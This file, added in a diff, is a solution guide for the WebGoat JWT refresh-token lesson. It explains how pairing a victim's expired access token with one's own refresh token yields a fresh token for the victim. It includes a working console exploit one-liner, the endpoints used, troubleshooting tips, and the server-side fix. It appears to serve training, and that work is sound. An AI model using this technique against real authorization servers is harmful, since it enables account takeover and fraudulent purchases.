@@ -1,0 +1,166 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH TOKEN MANIPULATION - QUICK START           ║
+║   Challenge: Make Tom pay for the books                  ║
+╚═══════════════════════════════════════════════════════════╝
+
+⚡ FASTEST METHOD - ONE-CLICK ATTACK
+
+1. Go to: http://192.168.254.112:8001/WebGoat/JWT
+   (Make sure you're logged into WebGoat)
+
+2. Navigate to the "Refreshing a token" lesson
+
+3. Open Console (F12)
+
+4. Copy/Paste this ONE-LINER:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+(async function(){const T='eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';const d=t=>JSON.parse(atob(t.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));console.log('%c[1] Tom expired','color:cyan');const l=await(await fetch('/WebGoat/JWT/refresh/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'Tom',password:'x'})})).json();console.log('%c[2] Got my refresh token','color:green');const a=await(await fetch('/WebGoat/JWT/refresh/newToken',{method:'POST',headers:{'Authorization':'Bearer '+T,'Content-Type':'application/json'},body:JSON.stringify({refresh_token:l.refresh_token})})).json();console.log('%c[3] ⚡ Got Tom new token - user:'+d(a.access_token).user,'color:red;font-weight:bold');const c=await(await fetch('/WebGoat/JWT/refresh/checkout',{method:'POST',headers:{'Authorization':'Bearer '+a.access_token,'Content-Type':'application/json'}})).json();console.log('%c[4] 🎉 SUCCESS! Tom paid!','color:green;font-size:18px;font-weight:bold');console.log(c);})();
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+5. Press Enter
+
+6. ✅ Done! Tom pays $31.53 💰
+
+═══════════════════════════════════════════════════════════
+
+📖 WHAT JUST HAPPENED?
+
+Step 1: Used Tom's EXPIRED token from log (user='Tom')
+Step 2: Got MY refresh token from JWT lesson
+Step 3: Sent Tom's token + MY refresh token → Got NEW token for Tom!
+Step 4: Used Tom's NEW token to checkout → Tom paid!
+
+═══════════════════════════════════════════════════════════
+
+🔓 THE VULNERABILITY
+
+The Authorization Server doesn't check that the refresh
+token belongs to the user in the access token.
+
+Attack: access_token(user='Tom') + refresh_token(user='ME')
+Result: Server issues NEW token for Tom! ❌
+
+Fix: Server MUST validate: access_token.user === refresh_token.user
+
+═══════════════════════════════════════════════════════════
+
+📋 TOM'S EXPIRED TOKEN (from access log)
+
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+
+Decoded:
+{
+  "iat": 1526131411,
+  "exp": 1526217811,
+  "admin": "false",
+  "user": "Tom"
+}
+
+Status: EXPIRED on May 13, 2018 ❌
+But still valid for refresh attack! ✅
+
+═══════════════════════════════════════════════════════════
+
+📂 ALTERNATIVE: Full Script with Logs
+
+See file: jwt_refresh_console_WORKING.txt
+
+This has:
+- Detailed step-by-step version
+- Manual fallback steps
+- Troubleshooting guide
+- Full attack explanation
+
+═══════════════════════════════════════════════════════════
+
+⚠️ TROUBLESHOOTING
+
+Error: "fetch is not defined" or "Failed to fetch"
+→ You must run this in the BROWSER console (F12)
+→ NOT in PowerShell or terminal
+→ Must be on http://192.168.254.112:8001/WebGoat/JWT page
+
+Error: 404 on /JWT/refresh/login
+→ Make sure you're in the "Refreshing a token" lesson
+→ Navigate through the JWT lessons to find it
+
+Error: 401 Unauthorized
+→ Make sure you're logged into WebGoat first
+→ Try refreshing the page
+
+Error: CORS or Cross-Origin
+→ You're running from wrong origin
+→ Must be on the WebGoat domain itself
+
+═══════════════════════════════════════════════════════════
+
+🎯 ENDPOINTS USED
+
+1. /WebGoat/JWT/refresh/login (POST)
+   → Get your refresh token
+   Body: {"user":"Tom","password":"x"}
+
+2. /WebGoat/JWT/refresh/newToken (POST)
+   → THE ATTACK: Refresh Tom's token with your refresh token
+   Header: Authorization: Bearer <Tom's expired token>
+   Body: {"refresh_token":"<your refresh token>"}
+
+3. /WebGoat/JWT/refresh/checkout (POST)
+   → Checkout with Tom's new token
+   Header: Authorization: Bearer <Tom's new token>
+
+═══════════════════════════════════════════════════════════
+
+📚 REFERENCE
+
+Original Bug Report:
+https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
+By: Mikail
+Found: Private Bugcrowd Program, November 2017
+
+Key Quote:
+"The Authorization Server was not checking the refresh 
+ token <-> access token association. This meant I could 
+ refresh someone else's access token using my refresh token."
+
+Impact: HIGH
+- Attacker can take over any account with old token
+- Very difficult to revoke (refresh token still works)
+- Bypass of access token expiration
+
+═══════════════════════════════════════════════════════════
+
+✅ SUCCESS INDICATORS
+
+Console should show:
+- [1] Tom expired (cyan)
+- [2] Got my refresh token (green)
+- [3] ⚡ Got Tom new token - user:Tom (red)
+- [4] 🎉 SUCCESS! Tom paid! (green, large)
+
+WebGoat should show:
+- Green checkmark on the lesson
+- "Congratulations!" or success message
+
+═══════════════════════════════════════════════════════════
+
+💡 KEY LEARNING
+
+Modern JWT implementations should:
+1. Store refresh_token → user_id mapping
+2. Verify refresh_token belongs to access_token.user
+3. Use one-time refresh tokens (rotate on each use)
+4. Monitor for suspicious refresh patterns
+5. Revoke all tokens on logout
+
+Don't just validate that refresh token EXISTS!
+Validate it belongs to the RIGHT USER!
+
+═══════════════════════════════════════════════════════════
+
+Tom's wallet: -$31.53 📉
+Your wallet: +$31.53 💰
+WebGoat lesson: PWNED ✅
+
+═══════════════════════════════════════════════════════════
